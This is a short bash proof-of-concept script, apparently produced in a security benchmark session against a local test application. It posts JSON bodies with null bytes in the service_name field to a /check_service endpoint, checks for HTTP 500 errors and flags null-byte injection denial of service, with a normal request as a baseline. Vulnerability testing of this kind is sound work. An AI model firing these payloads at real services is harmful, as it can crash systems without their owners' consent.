#!/bin/bash
# POC: Demonstrates null byte injection in /check_service endpoint causing HTTP 500 error and application crash
# Target: ./repo
# Created: 2025-11-07T17:21:51.749Z
# Session: benchmark-XBEN-068-24-mhp49w3p

# Null Byte Injection POC for /check_service endpoint
# This script demonstrates how null bytes in the service_name parameter
# cause the application to crash with a 500 error

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/check_service"

echo "================================================"
echo "Null Byte Injection POC - /check_service"
echo "================================================"
echo "Target: ${TARGET_URL}${ENDPOINT}"
echo ""

# Test 1: Null byte at end of service name
echo "[*] Test 1: Null byte at end of service name"
echo "    Payload: {\"service_name\": \"apache\u0000\"}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
  -H "Content-Type: application/json" \
  "${TARGET_URL}${ENDPOINT}" \
  -d '{"service_name": "apache\x00"}' 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "    HTTP Status: $HTTP_CODE"
echo "    Response: $BODY"

if [ "$HTTP_CODE" = "500" ]; then
  echo "    [✓] VULNERABLE: Null byte at end caused 500 error"
else
  echo "    [×] Not vulnerable or unexpected status"
fi
echo ""

# Test 2: Null byte at start of service name
echo "[*] Test 2: Null byte at start of service name"
echo "    Payload: {\"service_name\": \"\u0000apache\"}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
  -H "Content-Type: application/json" \
  "${TARGET_URL}${ENDPOINT}" \
  -d '{"service_name": "\x00apache"}' 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "    HTTP Status: $HTTP_CODE"
echo "    Response: $BODY"

if [ "$HTTP_CODE" = "500" ]; then
  echo "    [✓] VULNERABLE: Null byte at start caused 500 error"
else
  echo "    [×] Not vulnerable or unexpected status"
fi
echo ""

# Test 3: Normal request (baseline)
echo "[*] Test 3: Baseline - Normal request without null byte"
echo "    Payload: {\"service_name\": \"apache\"}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
  -H "Content-Type: application/json" \
  "${TARGET_URL}${ENDPOINT}" \
  -d '{"service_name": "apache"}' 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "    HTTP Status: $HTTP_CODE"
echo "    Response: $BODY"
echo ""

echo "================================================"
echo "Conclusion:"
echo "If Tests 1 and 2 show HTTP 500 while Test 3 shows 200,"
echo "the endpoint is vulnerable to null byte injection DoS"
echo "================================================"